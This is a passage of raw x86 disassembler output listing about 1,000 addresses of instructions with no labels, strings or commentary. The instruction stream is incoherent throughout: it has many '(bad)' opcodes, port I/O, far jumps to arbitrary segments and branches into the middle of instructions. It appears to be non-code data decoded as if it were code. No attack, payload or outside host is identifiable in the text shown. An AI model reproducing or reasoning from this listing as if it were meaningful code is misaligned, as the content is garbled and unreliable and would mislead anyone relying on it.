  40224f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402250:	push   edi
  402251:	add    eax,0x4541dce8
  402256:	in     eax,dx
  402257:	inc    edx
  402258:	mov    bl,0xe5
  40225a:	data16 and al,0x94
  40225d:	sbb    al,0xa
  40225f:	rcr    BYTE PTR [esi],cl
  402261:	nop
  402262:	xor    edi,ecx
  402264:	sub    dh,ah
  402266:	ss repnz in eax,0xa9
  40226a:	in     al,0xaf
  40226c:	retf   0x638d
  40226f:	push   es
  402270:	and    ebx,eax
  402272:	xchg   edi,eax
  402273:	mov    ebx,0xa2737544
  402278:	fstp   st(7)
  40227a:	mov    bl,0x32
  40227c:	or     al,0xd
  40227e:	js     0x402248
  402280:	popa   
  402281:	mov    eax,DWORD PTR [ecx+0x73]
  402284:	dec    edx
  402285:	mov    DWORD PTR [ebp+0x11e5f8f7],ebp
  40228b:	jmp    0x98d60516
  402290:	mov    ebp,0xe540f140
  402295:	bound  ebx,QWORD PTR [edi]
  402297:	or     eax,0x196f2817
  40229c:	fdiv   QWORD PTR [ebx+esi*1-0x75]
  4022a0:	add    al,0x9d
  4022a2:	sub    dh,0x56
  4022a5:	aas    
  4022a6:	sbb    BYTE PTR [edi+0x17],cl
  4022a9:	int3   
  4022aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022ab:	sbb    BYTE PTR [ebx+0x638ed471],bl
  4022b1:	shr    DWORD PTR [edx-0x8],1
  4022b4:	std    
  4022b5:	or     al,0x24
  4022b7:	mov    bl,0xa2
  4022b9:	outs   dx,BYTE PTR gs:[esi]
  4022bb:	fsub   DWORD PTR [eax]
  4022bd:	jae    0x4022c2
  4022bf:	add    cl,BYTE PTR ds:0xc3581954
  4022c5:	xor    ch,BYTE PTR [ebp-0x1a]
  4022c8:	push   ds
  4022c9:	or     BYTE PTR [esi],dh
  4022cb:	ss and al,0x3d
  4022ce:	aam    0xfa
  4022d0:	arpl   WORD PTR [edx+0x3bb07699],si
  4022d6:	mov    cl,0x8d
  4022d8:	mov    esp,DWORD PTR [edi-0x3a]
  4022db:	jb     0x4022bd
  4022dd:	jle    0x402311
  4022df:	dec    edi
  4022e0:	push   edx
  4022e1:	daa    
  4022e2:	dec    ebp
  4022e3:	or     BYTE PTR [ecx],bl
  4022e5:	imul   ebx,eax,0x59
  4022e8:	call   0xa58ee138
  4022ed:	sub    ch,BYTE PTR [eax]
  4022ef:	fs inc esp
  4022f1:	dec    esi
  4022f2:	and    eax,0xf4e72210
  4022f7:	into   
  4022f8:	scas   eax,DWORD PTR es:[edi]
  4022f9:	test   eax,0x3004e06b
  4022fe:	xor    bh,bl
  402300:	repnz xchg edi,eax
  402302:	nop
  402303:	fbstp  TBYTE PTR [esp+ecx*4-0x4e]
  402307:	stc    
  402308:	jmp    FWORD PTR [esi-0x58]
  40230b:	outs   dx,DWORD PTR ds:[esi]
  40230c:	imul   edi,DWORD PTR [ebx-0x372a0619],0x73322241
  402316:	mov    ah,BYTE PTR [ecx]
  402318:	inc    esp
  402319:	jae    0x4022a0
  40231b:	mov    ds:0xe868ed26,al
  402320:	adc    al,0xab
  402322:	xchg   edx,eax
  402323:	hlt    
  402324:	inc    edx
  402325:	xor    edi,ebp
  402327:	pop    esp
  402328:	push   esi
  402329:	ret    
  40232a:	in     al,0xe0
  40232c:	arpl   ax,bx
  40232e:	pop    ebx
  40232f:	sub    bh,BYTE PTR [ebp+0x13]
  402332:	sar    BYTE PTR [edi+0x74f8c641],0xcc
  402339:	loop   0x4022d4
  40233b:	data16 and dl,BYTE PTR [edx-0x53]
  40233f:	fist   WORD PTR [ebx-0x3e5d585d]
  402345:	jnp    0x4022f2
  402347:	mov    ebp,0x6921fbc9
  40234c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40234d:	dec    eax
  40234e:	ins    BYTE PTR es:[edi],dx
  40234f:	lods   eax,DWORD PTR ds:[esi]
  402350:	fsub   DWORD PTR ds:0x4e683247
  402356:	lds    ebp,FWORD PTR [ecx+0x7d73ab39]
  40235c:	retf   
  40235d:	mov    ecx,0xbff95c0f
  402362:	adc    al,0xbd
  402365:	outs   dx,BYTE PTR ds:[esi]
  402366:	jmp    0x55f9a186
  40236b:	pop    esi
  40236c:	mov    bl,0x6c
  40236e:	or     BYTE PTR [ebx],bh
  402370:	out    dx,al
  402371:	add    ebx,esp
  402373:	add    DWORD PTR [ebx+0x68],esp
  402376:	mov    bh,0x73
  402378:	xchg   ebp,eax
  402379:	pop    edi
  40237a:	(bad)  
  40237c:	push   esi
  40237d:	sub    eax,0xab465ace
  402382:	stos   DWORD PTR es:[edi],eax
  402383:	repz fld TBYTE PTR [eax+ebx*4+0x6a63b7fb]
  40238b:	inc    ebp
  40238c:	dec    eax
  40238d:	gs dec ebp
  40238f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402390:	addr16 push edx
  402392:	cmc    
  402393:	push   ds
  402394:	mov    bh,0x8
  402396:	shl    DWORD PTR [edx-0x7130f364],0x2f
  40239d:	ja     0x4023fa
  40239f:	add    ah,BYTE PTR [esi+0x5b]
  4023a2:	push   0x55
  4023a4:	mov    edx,0x3c4ab5b9
  4023a9:	loopne 0x402424
  4023ab:	outs   dx,DWORD PTR ds:[esi]
  4023ac:	lea    edx,[ecx-0x1a]
  4023af:	xchg   ecx,eax
  4023b0:	mov    ebp,0x48d492d0
  4023b5:	and    cl,BYTE PTR [edx-0x40b8de74]
  4023bb:	sti    
  4023bc:	fmul   QWORD PTR [esi+0x3b0e43ac]
  4023c2:	dec    ebx
  4023c3:	cdq    
  4023c4:	sbb    al,0x64
  4023c6:	fdiv   QWORD PTR [ecx+eax*1-0x4845ccad]
  4023cd:	(bad)  
  4023ce:	mov    bh,0xea
  4023d0:	fild   QWORD PTR [eax+0xb575f3e]
  4023d6:	sbb    BYTE PTR [ecx],bh
  4023d8:	js     0x402438
  4023da:	dec    ebx
  4023db:	lods   al,BYTE PTR ds:[esi]
  4023dc:	test   eax,0xd63517e4
  4023e1:	ret    0xfe84
  4023e4:	jmp    0x402436
  4023e6:	loop   0x40244b
  4023e8:	lock enter 0x73c3,0xa0
  4023ed:	fnstenv [edx+0x22]
  4023f0:	and    BYTE PTR [eax],ch
  4023f2:	xor    DWORD PTR [ebx-0x7c],ebp
  4023f5:	dec    ecx
  4023f6:	test   eax,0xd325d56a
  4023fb:	xor    DWORD PTR [edi+esi*2-0xf011c3e],0xa57cbc33
  402406:	imul   ebp,DWORD PTR [esi+edx*8+0x5fd84132],0xfffffff8
  40240e:	dec    edi
  40240f:	mov    al,BYTE PTR [ecx+0x51]
  402412:	lds    edx,FWORD PTR [ebx-0x5c1a01b1]
  402418:	das    
  402419:	mov    al,ds:0x6276d1a2
  40241e:	xchg   edi,eax
  40241f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402420:	dec    ebp
  402421:	mov    ebx,0xb97637
  402426:	pop    es
  402427:	sbb    BYTE PTR [edx+0x35731332],bh
  40242d:	xor    BYTE PTR [eax],bh
  40242f:	dec    ebx
  402430:	cmp    al,0x18
  402432:	inc    ecx
  402433:	jae    0x4023ef
  402435:	sub    dh,BYTE PTR [eax]
  402437:	jmp    0x5cde6201
  40243c:	repz pushf 
  40243e:	fimul  DWORD PTR [esi]
  402440:	sub    DWORD PTR [ebx],ecx
  402442:	inc    esp
  402443:	stos   DWORD PTR es:[edi],eax
  402444:	xor    dl,BYTE PTR [ebx+0x158764f8]
  40244a:	shl    BYTE PTR [esi],cl
  40244c:	mov    bh,0xbb
  40244e:	in     eax,dx
  40244f:	push   edi
  402450:	imul   esp,DWORD PTR [ebp+0x606b49f0],0xe94dcf1
  40245a:	push   ds
  40245b:	xor    ecx,esi
  40245d:	push   0xab749d86
  402462:	test   BYTE PTR [ecx+ebp*1],al
  402465:	popf   
  402466:	jg     0x402427
  402468:	das    
  402469:	push   ds
  40246a:	add    eax,0x3e0c5181
  40246f:	sub    eax,0x7da802c8
  402474:	add    dh,BYTE PTR [ebp+0x536a816b]
  40247a:	int    0x57
  40247c:	push   ebx
  40247d:	and    eax,0x5b01f85b
  402482:	fst    DWORD PTR [ecx+0x4a]
  402485:	sbb    edi,DWORD PTR ds:0x275260a2
  40248b:	jb     0x4024d9
  40248d:	add    eax,0x74fb0de8
  402492:	in     al,0xa4
  402494:	stos   BYTE PTR es:[edi],al
  402495:	(bad)  
  402496:	popa   
  402497:	push   ss
  402498:	pop    eax
  402499:	cdq    
  40249a:	mov    ecx,0x95ae8062
  40249f:	push   ebx
  4024a0:	jge    0x402440
  4024a2:	add    DWORD PTR [eax],ebx
  4024a4:	(bad)  
  4024a5:	sub    al,0x43
  4024a7:	pushf  
  4024a8:	xchg   ebx,eax
  4024a9:	xchg   ecx,eax
  4024aa:	or     BYTE PTR [eax],dh
  4024ac:	inc    esp
  4024ad:	mov    DWORD PTR [esi+0x6a221aa6],esp
  4024b3:	jne    0x4024bc
  4024b5:	add    ch,BYTE PTR [eax+0x53b779fc]
  4024bb:	fcomp  DWORD PTR cs:[eax-0x45a55ca8]
  4024c2:	mov    cl,0x8c
  4024c4:	leave  
  4024c5:	or     BYTE PTR [esi],0x16
  4024c8:	add    DWORD PTR [ebp-0x53ec61a2],0x21
  4024cf:	xchg   ebx,eax
  4024d0:	push   edi
  4024d1:	into   
  4024d2:	mov    ds:0xf55f2557,eax
  4024d7:	outs   dx,DWORD PTR ds:[esi]
  4024d8:	es and eax,0xe102f5c3
  4024de:	int    0xc2
  4024e0:	xor    DWORD PTR [eax+0x170d07af],ebx
  4024e6:	pop    ebp
  4024e7:	mov    ah,0x5b
  4024e9:	test   ebx,ecx
  4024eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024ec:	cli    
  4024ed:	add    DWORD PTR [ebp-0x15],ebx
  4024f0:	outs   dx,DWORD PTR ds:[esi]
  4024f1:	mov    ebp,0xd7f0bf8f
  4024f6:	call   0xd956:0x6c3a22a0
  4024fd:	aad    0x37
  4024ff:	xchg   BYTE PTR [eax+esi*4+0x75],dl
  402503:	adc    al,dl
  402505:	jnp    0x402565
  402507:	cmp    eax,0x15eab04a
  40250c:	pop    edi
  40250d:	dec    eax
  40250e:	lds    ebx,FWORD PTR [ebx+0xf989484]
  402514:	pop    ebp
  402515:	dec    esi
  402516:	pop    ss
  402517:	xor    edi,eax
  402519:	dec    esp
  40251a:	inc    ebp
  40251b:	jmp    0x1072beee
  402520:	test   DWORD PTR [esi],ecx
  402522:	adc    bh,BYTE PTR [eax]
  402524:	sbb    eax,0x86f50631
  402529:	nop
  40252a:	sti    
  40252b:	arpl   dx,cx
  40252d:	xor    BYTE PTR [esi-0x3c],cl
  402530:	pop    esi
  402531:	(bad)  
  402532:	enter  0x1094,0xce
  402536:	out    0x6a,eax
  402538:	lods   al,BYTE PTR ds:[esi]
  402539:	push   esp
  40253a:	sbb    edi,DWORD PTR [ebx-0x4a]
  40253d:	sbb    eax,0x4c4cdaff
  402542:	out    0xcf,eax
  402544:	jno    0x4024cc
  402546:	call   0x66df:0x31c83414
  40254d:	xor    al,BYTE PTR [edx]
  40254f:	pushf  
  402550:	into   
  402551:	adc    edx,edx
  402553:	dec    ebx
  402554:	mov    ds:0x77c0dfa3,eax
  402559:	jno    0x4025be
  40255b:	sbb    DWORD PTR [ebp-0x4b],0xffffff98
  40255f:	adc    edx,DWORD PTR [ebx+0x794bdddd]
  402565:	ror    DWORD PTR [edi+0x74f6770d],cl
  40256b:	dec    edx
  40256c:	mov    BYTE PTR [ebx+0x4432498a],0xe6
  402573:	popf   
  402574:	outs   dx,DWORD PTR ds:[esi]
  402575:	shr    eax,0xa6
  402578:	sub    eax,0x38381639
  40257d:	jno    0x40250f
  40257f:	aaa    
  402580:	dec    ebp
  402581:	fcom   DWORD PTR [ebp+0xd9519db]
  402587:	stos   DWORD PTR es:[edi],eax
  402588:	mov    cl,0xa5
  40258a:	ror    esi,cl
  40258c:	outs   dx,DWORD PTR ds:[esi]
  40258d:	lds    edx,FWORD PTR [ebx-0x4e]
  402590:	nop
  402591:	xor    eax,ecx
  402593:	stos   DWORD PTR es:[edi],eax
  402594:	cmp    dl,BYTE PTR [ebx-0x27ab0020]
  40259a:	mov    ?,WORD PTR [edi+0x6bf6748]
  4025a0:	das    
  4025a1:	mov    ah,0xe1
  4025a3:	stos   DWORD PTR es:[edi],eax
  4025a4:	pop    ebx
  4025a5:	lods   eax,DWORD PTR ds:[esi]
  4025a6:	test   BYTE PTR [ebp-0x5f],al
  4025a9:	inc    esp
  4025aa:	jmp    0x6b77:0x976804cf
  4025b1:	test   DWORD PTR [eax+0xc],ebx
  4025b4:	and    esp,0xb44f4997
  4025ba:	lods   eax,DWORD PTR ds:[esi]
  4025bb:	pop    esi
  4025bc:	iret   
  4025bd:	pushf  
  4025be:	push   ecx
  4025bf:	push   es
  4025c0:	mov    ebp,0xf61e4cce
  4025c5:	or     DWORD PTR [ebx+0x1d],eax
  4025c8:	push   ds
  4025c9:	dec    esi
  4025ca:	out    0x47,al
  4025cc:	fmul   DWORD PTR [ebx+0x77]
  4025cf:	in     eax,dx
  4025d0:	call   0xbd27:0x18441b85
  4025d7:	enter  0x9ea0,0x3
  4025db:	push   edi
  4025dc:	cwde   
  4025dd:	add    BYTE PTR [esi],bl
  4025df:	xchg   ebp,eax
  4025e0:	test   dl,0xb0
  4025e3:	in     al,dx
  4025e4:	sub    eax,0x44af0c83
  4025e9:	pusha  
  4025ea:	jno    0x402571
  4025ec:	jb     0x40259e
  4025ee:	pop    ss
  4025ef:	pop    eax
  4025f0:	xor    bh,al
  4025f2:	out    dx,al
  4025f3:	xor    esp,DWORD PTR [edi]
  4025f5:	jg     0x40257f
  4025f7:	adc    al,BYTE PTR [ebp+0x34945c48]
  4025fd:	es cwde 
  4025ff:	imul   ecx,DWORD PTR [ebp+0x7b84cafe],0xffffffc0
  402606:	inc    ebp
  402607:	mov    DWORD PTR [eax],ebx
  402609:	mov    ds:0x94a93890,eax
  40260e:	lahf   
  40260f:	mov    ch,0xe6
  402611:	iret   
  402612:	sti    
  402613:	sbb    BYTE PTR [edi],ch
  402615:	sar    bh,cl
  402617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402618:	sti    
  402619:	xchg   edi,eax
  40261a:	and    cl,BYTE PTR [ebx-0x79]
  40261d:	push   0xffffff81
  40261f:	jmp    0xc7b639bd
  402624:	dec    esi
  402625:	hlt    
  402626:	sub    ch,BYTE PTR [edx]
  402628:	lods   al,BYTE PTR ds:[esi]
  402629:	pusha  
  40262a:	es pop ecx
  40262c:	mov    esi,0xf336689b
  402631:	fldl2t 
  402633:	inc    ebx
  402634:	clc    
  402635:	and    DWORD PTR [esi+0x383e949b],edx
  40263b:	loope  0x402667
  40263d:	sub    ebx,DWORD PTR [eax]
  40263f:	or     DWORD PTR ds:0xbad44344,edx
  402645:	pop    ss
  402646:	mov    dl,0xb1
  402648:	add    al,0xfe
  40264a:	adc    edi,edi
  40264c:	sar    DWORD PTR [ebx+0x42f99712],1
  402652:	pop    ebp
  402653:	inc    edx
  402654:	jno    0x40266a
  402656:	pop    ecx
  402657:	test   al,0x3
  402659:	cmp    BYTE PTR [ecx+eax*4],al
  40265c:	jg     0x402619
  40265e:	sti    
  40265f:	test   eax,0x2b48d840
  402664:	mov    al,ds:0x89c1a2d6
  402669:	xchg   ebp,eax
  40266a:	addr16 dec cl
  40266d:	stos   BYTE PTR es:[edi],al
  40266e:	fbstp  TBYTE PTR [ecx-0x26215d2f]
  402674:	push   0x38bd3eba
  402679:	sub    al,0x6c
  40267b:	inc    ebx
  40267c:	es call 0xbddaac56
  402682:	pop    ds
  402683:	or     BYTE PTR [esi-0x47ffab3],dl
  402689:	or     ah,al
  40268b:	setp   ah
  40268e:	mov    ebp,0xf12e2aa1
  402693:	push   edx
  402694:	inc    ebp
  402695:	(bad)  
  402697:	add    BYTE PTR [eax+0x3b],cl
  40269a:	dec    esp
  40269b:	xlat   BYTE PTR ds:[ebx]
  40269c:	adc    al,0xcb
  40269e:	cld    
  40269f:	or     esp,DWORD PTR [ecx]
  4026a1:	inc    ebx
  4026a2:	add    ch,BYTE PTR [esi+0x31f231ea]
  4026a8:	in     eax,0xbc
  4026aa:	push   ecx
  4026ab:	mov    ds,WORD PTR [esi+0x1d]
  4026ae:	fiadd  WORD PTR [eax-0x138688c]
  4026b4:	push   0xffffffc9
  4026b6:	out    dx,al
  4026b7:	cmp    ah,BYTE PTR [edx]
  4026b9:	popa   
  4026ba:	scas   al,BYTE PTR es:[edi]
  4026bb:	mov    BYTE PTR [edi+0x29],0x14
  4026bf:	out    0xda,eax
  4026c1:	sti    
  4026c2:	mov    edi,0x6c8afd4a
  4026c7:	pop    eax
  4026c8:	adc    esi,DWORD PTR [edi-0x6a]
  4026cb:	jne    0x40269d
  4026cd:	rcr    DWORD PTR [esi+0xc],1
  4026d0:	repz push eax
  4026d2:	pusha  
  4026d3:	es in  al,dx
  4026d5:	imul   ebx,ecx,0x7b79150a
  4026db:	adc    BYTE PTR [eax],ch
  4026dd:	cwde   
  4026de:	rol    DWORD PTR [edi-0x7f867a3],0x49
  4026e5:	call   0x1c324ea
  4026ea:	or     dh,BYTE PTR [edi-0x55]
  4026ed:	sub    cl,BYTE PTR [esi-0x532761b6]
  4026f3:	mov    BYTE PTR [edi+esi*2],bl
  4026f6:	or     dl,dh
  4026f8:	push   ss
  4026f9:	dec    esp
  4026fa:	or     ecx,DWORD PTR [ecx+0x7d]
  4026fd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4026ff:	(bad)  
  402700:	fwait
  402701:	jg     0x402744
  402703:	retf   0x3930
  402706:	(bad)  
  402707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402708:	xlat   BYTE PTR ds:[ebx]
  402709:	out    0xa3,eax
  40270b:	(bad)  
  40270c:	sbb    dh,BYTE PTR gs:[ebp+0x68de6465]
  402713:	jo     0x40271e
  402715:	or     esi,esi
  402717:	xor    dh,BYTE PTR [edi]
  402719:	aas    
  40271a:	je     0x402729
  40271c:	and    ecx,0x20c8c2ca
  402722:	jp     0x4026cd
  402724:	or     DWORD PTR [edx-0x28],edx
  402727:	call   0x76d15ee1
  40272c:	ficom  DWORD PTR [edi+0x31]
  40272f:	jp     0x4027a9
  402731:	(bad)  
  402732:	xlat   BYTE PTR ds:[ebx]
  402733:	mov    ah,0x67
  402735:	mov    bh,0x9a
  402737:	mov    edx,0x8f9c9ce9
  40273c:	shr    BYTE PTR [edi],1
  40273e:	ret    
  40273f:	cmp    BYTE PTR [ebp-0x70],0xf7
  402743:	mov    ebx,0x4d24ff85
  402748:	jo     0x402751
  40274a:	idiv   BYTE PTR [esi+edx*8+0x51]
  40274e:	xchg   BYTE PTR [ecx],bl
  402750:	xchg   esi,eax
  402751:	cwde   
  402752:	(bad)  
  402753:	(bad)  
  402754:	and    al,0x96
  402756:	addr16 mov esi,0x6b7fb78d
  40275c:	add    ebx,ebp
  40275e:	xchg   edx,eax
  40275f:	cmp    DWORD PTR [ecx-0x1f],ebp
  402762:	cmp    DWORD PTR [eax+0x1dbb4642],0xffffff84
  402769:	stos   DWORD PTR es:[edi],eax
  40276a:	in     eax,dx
  40276b:	cmp    eax,0x7554d52c
  402770:	xchg   esi,eax
  402771:	imul   ebx,DWORD PTR [ebx],0xffffffee
  402774:	xchg   ecx,eax
  402775:	jmp    0xb807:0xad992c15
  40277c:	dec    ecx
  40277d:	and    ecx,DWORD PTR [edx]
  40277f:	and    DWORD PTR [esi-0x5128b2af],ebx
  402785:	aad    0xb2
  402787:	push   eax
  402788:	aad    0xe8
  40278a:	jmp    0xe85bcda7
  40278f:	into   
  402790:	and    al,0x94
  402792:	stc    
  402793:	xchg   edx,eax
  402794:	aas    
  402795:	mov    ebp,ebp
  402797:	mov    ebp,0x37214a9f
  40279c:	mov    eax,ds:0x8eadd5a3
  4027a1:	push   es
  4027a2:	cvttps2pi mm4,xmm7
  4027a5:	jb     0x4027dd
  4027a7:	mov    edx,ss
  4027a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027aa:	dec    edi
  4027ab:	pop    edi
  4027ac:	sbb    al,0x81
  4027ae:	arpl   WORD PTR [edx-0x27044384],dx
  4027b4:	add    DWORD PTR [eax-0x31],ecx
  4027b7:	ror    eax,1
  4027b9:	js     0x40280f
  4027bb:	or     al,0xcf
  4027bd:	xchg   edi,eax
  4027be:	xchg   ebx,eax
  4027bf:	add    esi,0x47
  4027c2:	mov    dl,0x1
  4027c4:	mov    bl,0xc0
  4027c6:	(bad)  
  4027c7:	xor    eax,0x8674b5bc
  4027cc:	(bad)  
  4027cd:	mov    ss,WORD PTR [ecx+0x6]
  4027d0:	jae    0x4027ab
  4027d2:	mov    bh,0x8e
  4027d4:	pop    ss
  4027d5:	cmp    eax,0x9df021ad
  4027da:	adc    eax,0xf0151d0e
  4027df:	(bad)  
  4027e0:	mov    cl,bl
  4027e2:	neg    DWORD PTR [ecx]
  4027e4:	jnp    0x40283c
  4027e6:	out    0x4e,al
  4027e8:	adc    BYTE PTR [eax+0x45],cl
  4027eb:	aam    0x32
  4027ed:	jo     0x4027fb
  4027ef:	or     DWORD PTR [ecx-0x20c65682],esi
  4027f5:	ret    0x5851
  4027f8:	fild   DWORD PTR [edx-0x1a]
  4027fb:	jne    0x4027f1
  4027fd:	dec    eax
  4027fe:	xor    edi,DWORD PTR [ecx]
  402800:	cmp    esi,edi
  402802:	das    
  402803:	xchg   edx,eax
  402804:	fnstenv [esi-0x56]
  402807:	js     0x402883
  402809:	dec    ecx
  40280a:	ret    
  40280b:	push   0x29100a7e
  402810:	or     eax,0xf6284770
  402815:	std    
  402816:	xchg   edi,eax
  402817:	ret    
  402818:	(bad)  [edx+0x5397fe08]
  40281e:	push   ds
  40281f:	fadd   QWORD PTR [esi]
  402821:	js     0x402800
  402823:	jge    0x40284f
  402825:	jecxz  0x40287c
  402827:	or     bl,0xf6
  40282a:	or     al,0x7e
  40282c:	adc    DWORD PTR [ebx],0x6572bd53
  402832:	mov    bl,0xa0
  402834:	jae    0x40282d
  402836:	xlat   BYTE PTR ds:[ebx]
  402837:	pusha  
  402838:	xor    BYTE PTR [esi+0x66],bl
  40283b:	test   bl,dl
  40283d:	mov    edi,0x90d7ca33
  402842:	jmp    0x8780:0xcd8a65bc
  402849:	nop
  40284a:	mov    eax,ds:0x9a81858a
  40284f:	sub    esp,DWORD PTR [esi-0x72]
  402852:	cmp    BYTE PTR [ecx-0x22ed278f],al
  402858:	call   0x604a:0x871cccfe
  40285f:	xlat   BYTE PTR ds:[ebx]
  402860:	xor    dh,BYTE PTR [ebx-0x45eac1fc]
  402866:	ss mov dh,0x79
  402869:	add    esp,ecx
  40286b:	adc    eax,0x72f7843e
  402870:	ds pop ebp
  402872:	lods   eax,DWORD PTR ds:[esi]
  402873:	push   cs
  402874:	int3   
  402875:	xor    al,0x3a
  402877:	mov    DWORD PTR [edx+0x17f97a99],ebx
  40287d:	adc    edx,DWORD PTR [esi]
  40287f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402881:	ds clc 
  402883:	fnsave [edx]
  402885:	adc    dl,BYTE PTR [esi-0x7b]
  402888:	in     eax,dx
  402889:	(bad)  
  40288a:	pop    ecx
  40288b:	ret    0x2485
  40288e:	sahf   
  40288f:	push   0x3b
  402891:	mov    al,ds:0x46a547a3
  402896:	cli    
  402897:	and    cl,BYTE PTR [edi]
  402899:	ins    DWORD PTR es:[edi],dx
  40289a:	mov    ebp,0xd8058d95
  40289f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028a0:	xchg   ebx,eax
  4028a1:	cmp    eax,0x8ebe6eb0
  4028a6:	inc    ebp
  4028a7:	cmp    DWORD PTR [ecx+ecx*2-0x11],ebp
  4028ab:	add    eax,0x64e501ab
  4028b0:	cs inc eax
  4028b2:	ja     0x402882
  4028b4:	(bad)  
  4028b5:	out    dx,eax
  4028b6:	jle    0x402920
  4028b8:	jae    0x402929
  4028ba:	fisttp DWORD PTR [ebx+0x431b843a]
  4028c0:	jmp    0x40290e
  4028c2:	push   ecx
  4028c3:	rol    BYTE PTR [edi],0x93
  4028c6:	mov    cl,0xb1
  4028c8:	clc    
  4028c9:	(bad)  
  4028ca:	fwait
  4028cb:	out    dx,eax
  4028cc:	xlat   BYTE PTR ds:[ebx]
  4028cd:	jns    0x402913
  4028cf:	sbb    al,BYTE PTR [ebx]
  4028d1:	scas   eax,DWORD PTR es:[edi]
  4028d2:	pop    ebp
  4028d3:	xchg   edx,eax
  4028d4:	mov    edi,0x59292ef6
  4028d9:	mov    ds:0x77c3f45,eax
  4028de:	jb     0x4028b8
  4028e0:	jb     0x4028aa
  4028e2:	stos   DWORD PTR es:[edi],eax
  4028e3:	rol    DWORD PTR [ebx+edx*1+0x51],cl
  4028e7:	jmp    0xa047a3d
  4028ec:	(bad)
  4028f0:	mov    edx,0x56e7ea0d
  4028f5:	push   es
  4028f6:	xchg   DWORD PTR [edi],ebx
  4028f8:	add    DWORD PTR [edi+0x48cfd25f],0xffffffdd
  4028ff:	fimul  DWORD PTR fs:[edx+0x6c]
  402903:	int    0x6f
  402905:	aaa    
  402906:	or     eax,0x7a499
  40290b:	stos   DWORD PTR es:[edi],eax
  40290c:	pushf  
  40290d:	fcomip st,st(2)
  40290f:	push   ebx
  402910:	sub    BYTE PTR [ebp+ebx*8+0x5],al
  402914:	pop    eax
  402915:	push   ds
  402916:	xor    al,0xa6
  402918:	pop    edi
  402919:	ds sahf 
  40291b:	imul   esi
  40291d:	mov    cs,WORD PTR [esi+0x6f]
  402920:	sub    eax,0x7bfc8614
  402925:	fsub   DWORD PTR [edx]
  402927:	shl    bh,1
  402929:	fs out 0xb6,al
  40292c:	dec    edi
  40292d:	and    bl,bh
  40292f:	mov    BYTE PTR [ebx+0x2b67a24f],bh
  402935:	fucomip st,st(5)
  402937:	je     0x4028d6
  402939:	push   edi
  40293a:	mov    ebp,0xf25912ee
  40293f:	repz push es
  402941:	(bad)  
  402943:	dec    ecx
  402944:	mov    dh,0xfc
  402946:	mov    eax,DWORD PTR [ecx-0x58]
  402949:	add    ecx,DWORD PTR [ecx+0x2cc3f7cd]
  40294f:	pop    ss
  402950:	int3   
  402951:	cmc    
  402952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402954:	pop    ebp
  402955:	pushf  
  402956:	loope  0x4029b6
  402958:	dec    esi
  402959:	push   0xffffff9e
  40295b:	mov    bl,0x8
  40295d:	add    ebx,DWORD PTR [eax]
  40295f:	cmp    DWORD PTR ds:0x25cdbdb,0xff8d81a1
  402969:	dec    edi
  40296a:	jp     0x40297f
  40296c:	cmp    bh,BYTE PTR [edx-0x3]
  40296f:	enter  0x81f8,0x67
  402973:	aam    0x54
  402975:	and    BYTE PTR [edi],al
  402977:	add    ah,BYTE PTR [eax+0x25]
  40297a:	dec    edi
  40297b:	add    eax,0xa920e6a9
  402980:	(bad)  
  402981:	adc    BYTE PTR [eax-0x2e],ah
  402984:	pop    esi
  402985:	ds sbb al,0x94
  402988:	push   ss
  402989:	test   eax,0x1907666d
  40298e:	cmc    
  40298f:	xor    BYTE PTR [esi+0x5348419f],dl
  402995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402996:	push   edx
  402997:	mov    al,0x7e
  402999:	or     al,0x16
  40299b:	ins    BYTE PTR es:[edi],dx
  40299c:	pop    ss
  40299d:	dec    edx
  40299e:	sub    BYTE PTR [edx],0x50
  4029a1:	loopne 0x40298a
  4029a3:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4029a5:	push   edx
  4029a6:	pop    ds
  4029a7:	or     ebp,DWORD PTR [eax]
  4029a9:	outs   dx,BYTE PTR ds:[esi]
  4029aa:	hlt    
  4029ab:	dec    ecx
  4029ac:	fstp   DWORD PTR [ecx]
  4029ae:	ret    
  4029af:	lea    esi,ss:[edi]
  4029b2:	xor    BYTE PTR [ebx],bh
  4029b4:	js     0x402a30
  4029b6:	xchg   DWORD PTR [edi],esp
  4029b8:	adc    esi,ebx
  4029ba:	pop    ebx
  4029bb:	rol    ch,1
  4029bd:	cs rcl cl,cl
  4029c0:	loopne 0x4029c2
  4029c2:	sbb    eax,0x227fd221
  4029c7:	push   ebp
  4029c8:	ins    BYTE PTR es:[edi],dx
  4029c9:	shl    DWORD PTR [edx+0x40f96ded],0xd6
  4029d0:	mov    edx,0x892de05c
  4029d5:	loope  0x402a1e
  4029d7:	push   eax
  4029d8:	pop    edi
  4029d9:	mov    ds:0x19dba998,al
  4029de:	add    ecx,edi
  4029e0:	pop    edx
  4029e1:	fild   WORD PTR [edi-0x503d2da3]
  4029e7:	addr16 pop ds
  4029e9:	or     ch,bh
  4029eb:	mov    WORD PTR [ecx+0x7483f964],ds
  4029f1:	aaa    
  4029f2:	add    BYTE PTR [edi-0xb],dl
  4029f5:	cdq    
  4029f6:	inc    ebp
  4029f7:	adc    ecx,DWORD PTR [edi-0x4c7cce94]
  4029fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029fe:	mov    ds:0x93f96421,al
  402a03:	repz adc DWORD PTR [ebp-0x39af863e],ecx
  402a0a:	xor    dh,BYTE PTR [esi+0x5d83441]
  402a10:	test   BYTE PTR [ecx],0x5b
  402a13:	mov    al,0xad
  402a15:	push   edx
  402a16:	xor    DWORD PTR [ebp-0x2],0xd
  402a1a:	lahf   
  402a1b:	jmp    FWORD PTR [esi+0x267cb802]
  402a21:	pop    edi
  402a22:	fcmovne st,st(1)
